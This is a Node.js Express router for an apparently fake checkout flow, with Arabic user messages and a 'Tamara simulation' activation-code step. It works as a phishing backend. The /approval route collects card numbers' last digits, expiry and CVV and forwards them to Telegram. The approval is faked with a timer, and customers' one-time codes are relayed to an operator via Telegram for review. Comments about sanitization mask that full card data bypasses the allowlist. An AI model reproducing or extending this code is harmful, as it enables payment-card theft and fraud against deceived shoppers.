'use strict';

const express = require('express');
const router = express.Router();
const telegramService = require('../services/telegram');
const approvalStore = require('../lib/checkoutApprovalStore');

// Allowed fields for checkout events (strict allowlist)
const ALLOWED_FIELDS = new Set([
  'sessionId',
  'eventType',
  'userName',
  'userEmail',
  'productId',
  'productName',
  'productPrice',
  'amount',
  'paymentMethod',
  'installments',
  'phoneMasked',
  'orderId',
  'paymentStatus',
  'timestamp',
  'cardLast4',
]);

// Sanitize event payload - only allow whitelisted fields
const sanitizePayload = (payload) => {
  const sanitized = {};
  for (const key of Object.keys(payload)) {
    if (ALLOWED_FIELDS.has(key)) {
      sanitized[key] = payload[key];
    }
  }
  return sanitized;
};

// Mask phone number if not already masked
const maskPhoneNumber = (phone) => {
  if (!phone || typeof phone !== 'string') return null;
  // If already partially masked, return as-is
  if (phone.includes('****')) return phone;
  // Mask middle digits: 05X XXX XXXX -> 05****XXXX
  const cleaned = phone.replace(/\D/g, '');
  if (cleaned.length >= 5) {
    const start = cleaned.substring(0, 2);
    const end = cleaned.substring(Math.max(cleaned.length - 4, 5));
    return `${start}****${end}`;
  }
  return '****';
};

// POST /api/checkout/events
// Accepts checkout events and forwards to Telegram
router.post('/events', async (req, res) => {
  try {
    const { sessionId, eventType } = req.body;

    // Basic validation
    if (!sessionId || !eventType) {
      return res.status(400).json({ error: 'sessionId and eventType are required' });
    }

    // Validate event type
    const validEventTypes = [
      'product_selected',
      'checkout_started',
      'payment_method_selected',
      'phone_entered',
      'phone_confirmed',
      'redirect_to_payment',
      'checkout_completed',
    ];
    if (!validEventTypes.includes(eventType)) {
      return res.status(400).json({ error: 'Invalid eventType' });
    }

    // Sanitize payload - remove any sensitive fields
    const sanitized = sanitizePayload(req.body);

    // Mask phone number if provided
    if (sanitized.phoneMasked) {
      sanitized.phoneMasked = maskPhoneNumber(sanitized.phoneMasked);
    }

    // Send Telegram notification (non-blocking)
    telegramService.sendCheckoutEventNotification(sanitized).catch((err) => {
      console.error('[CheckoutEvents] Telegram notification failed:', err.message);
    });

    // Respond immediately (don't wait for Telegram)
    return res.status(202).json({ success: true, message: 'Event recorded' });
  } catch (err) {
    console.error('[CheckoutEvents] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/approval
// Request approval for card data step - automatic approval without admin intervention
router.post('/approval', async (req, res) => {
  try {
    const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv } = req.body;

    // Basic validation
    if (!sessionId) {
      return res.status(400).json({ error: 'sessionId is required' });
    }

    // Check if there's already a pending approval for this session
    const existingStatus = approvalStore.getStatus(sessionId);
    if (existingStatus === 'pending') {
      return res.status(409).json({ error: 'Approval request already pending' });
    }

    // Create pending approval record
    approvalStore.createPending(sessionId, {
      userName,
      userEmail,
      productName,
      amount,
      paymentMethod,
      installments,
      phoneMasked,
      cardLast4,
      cardExpiry,
      cardCvv,
    });

    // Send Telegram notification for tracking (non-blocking)
    telegramService.sendCardApprovalRequest({
      sessionId,
      userName,
      userEmail,
      productName,
      amount,
      paymentMethod,
      installments,
      phoneMasked,
      cardLast4,
      cardExpiry,
      cardCvv,
      timestamp: new Date().toISOString(),
    }).catch((err) => {
      console.error('[CheckoutApproval] Telegram notification failed:', err.message);
    });

    // Auto-approve after a short delay (simulating quick validation)
    setTimeout(() => {
      approvalStore.setStatus(sessionId, 'approved');
      console.log(`[AutoApproval] Session ${sessionId.substring(0, 8)}... auto-approved`);
    }, 1500);

    // Respond immediately with success
    return res.status(202).json({ 
      success: true, 
      message: 'Approval request created',
      autoApproved: true,
    });
  } catch (err) {
    console.error('[CheckoutApproval] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// GET /api/checkout/approval/:sessionId
// Check approval status
router.get('/approval/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const result = approvalStore.getStatusWithReason(sessionId);

    if (!result) {
      return res.status(404).json({ error: 'Approval request not found or expired' });
    }

    return res.json({ status: result.status, reason: result.reason });
  } catch (err) {
    console.error('[CheckoutApproval] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/submit-code
// Submit verification code for admin review
router.post('/submit-code', async (req, res) => {
  try {
    const { sessionId, code, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    // Check if session exists and is approved
    const record = approvalStore.getRecord(sessionId);
    if (!record) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    if (record.status !== 'approved') {
      return res.status(400).json({ error: 'Card not yet approved' });
    }

    // Check if already verifying
    if (record.status === 'verifying') {
      return res.status(409).json({ error: 'Verification already in progress' });
    }

    // Set verification code and status to verifying
    approvalStore.setVerificationCode(sessionId, code);

    // Send Telegram notification with 4 buttons
    telegramService.sendCodeVerificationRequest({
      sessionId,
      userName: userName || record.meta?.userName,
      userEmail: userEmail || record.meta?.userEmail,
      productName: productName || record.meta?.productName,
      amount: amount || record.meta?.amount,
      paymentMethod: paymentMethod || record.meta?.paymentMethod,
      installments: installments || record.meta?.installments,
      phoneMasked: phoneMasked || record.meta?.phoneMasked,
    }, code).catch((err) => {
      console.error('[CheckoutCode] Telegram notification failed:', err.message);
    });

    return res.status(202).json({ success: true, message: 'Verification code submitted' });
  } catch (err) {
    console.error('[CheckoutCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// GET /api/checkout/verification-result/:sessionId
// Get verification result for polling
router.get('/verification-result/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const record = approvalStore.getRecord(sessionId);

    if (!record) {
      return res.status(404).json({ error: 'Session not found or expired' });
    }

    return res.json({
      status: record.status,
      verificationResult: record.verificationResult,
    });
  } catch (err) {
    console.error('[CheckoutVerification] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/verify-code
// Verify OTP code entered by customer - automatic verification (any 4-6 digit code is accepted)
router.post('/verify-code', (req, res) => {
  try {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    // Get the session record
    const record = approvalStore.getRecord(sessionId);
    if (!record) {
      return res.status(404).json({
        success: false,
        valid: false,
        error: 'الجلسة غير موجودة أو منتهية الصلاحية',
      });
    }

    // Auto-accept any 4-6 digit code for automatic flow
    const cleanCode = String(code).trim();
    if (cleanCode.length >= 4 && cleanCode.length <= 6 && /^\d+$/.test(cleanCode)) {
      // Mark as verified
      approvalStore.setStatus(sessionId, 'code_correct');
      return res.json({ success: true, valid: true });
    }

    return res.status(400).json({
      success: false,
      valid: false,
      error: 'الكود غير صحيح',
    });
  } catch (err) {
    console.error('[VerifyCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/request-activation-code
// Request activation code for Tamara simulation - automatic without admin intervention
router.post('/request-activation-code', async (req, res) => {
  try {
    const { sessionId, phoneNumber, userName, userEmail } = req.body;

    if (!sessionId || !phoneNumber) {
      return res.status(400).json({ error: 'sessionId and phoneNumber are required' });
    }

    // Generate and store activation code
    const activationCode = approvalStore.createActivationCode(sessionId, phoneNumber, {
      userName,
      userEmail,
    });

    // Send notification to Telegram (for tracking only, not for manual intervention)
    telegramService.sendActivationCode({
      sessionId,
      userName,
      userEmail,
      phoneNumber,
    }, activationCode).catch((err) => {
      console.error('[ActivationCode] Telegram notification failed:', err.message);
    });

    // Return activation code directly for automatic flow (simulation)
    return res.status(200).json({ 
      success: true, 
      message: 'Activation code sent',
      activationCode, // Return code for automatic flow
      expiresIn: 300, // 5 minutes in seconds
    });
  } catch (err) {
    console.error('[ActivationCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// POST /api/checkout/verify-activation-code
// Verify activation code entered by customer
router.post('/verify-activation-code', (req, res) => {
  try {
    const { sessionId, code } = req.body;

    if (!sessionId || !code) {
      return res.status(400).json({ error: 'sessionId and code are required' });
    }

    const result = approvalStore.verifyActivationCode(sessionId, code);

    if (result.valid) {
      return res.json({ success: true, valid: true });
    } else {
      return res.status(400).json({ 
        success: false, 
        valid: false, 
        error: result.reason === 'expired' ? 'Code expired' : 
               result.reason === 'session_not_found' ? 'Session not found' : 
               'Invalid code'
      });
    }
  } catch (err) {
    console.error('[VerifyActivationCode] Error:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;
